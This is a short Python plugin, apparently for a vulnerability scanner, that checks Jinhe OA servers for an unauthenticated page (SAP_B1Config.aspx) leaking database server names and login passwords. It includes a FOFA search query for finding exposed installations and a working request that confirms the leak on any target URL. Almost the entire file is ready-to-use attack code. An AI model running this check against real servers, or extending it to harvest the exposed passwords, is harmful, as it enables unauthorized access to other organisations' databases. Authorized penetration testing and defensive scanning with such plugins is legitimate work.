#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/0Oa9aVGHZrG_Fo1wakKW5g',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '金和OA SAP_B1Config.aspx未授权信息泄露',

      'level'     :   'high',

      'FOFA'      :   'app="金和网络-金和OA"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/8',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    if res.status_code == 200 and re.search(r'数据库服务器名.*?监听器服务器名.*?数据库登录密码.*?程序登录密码',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret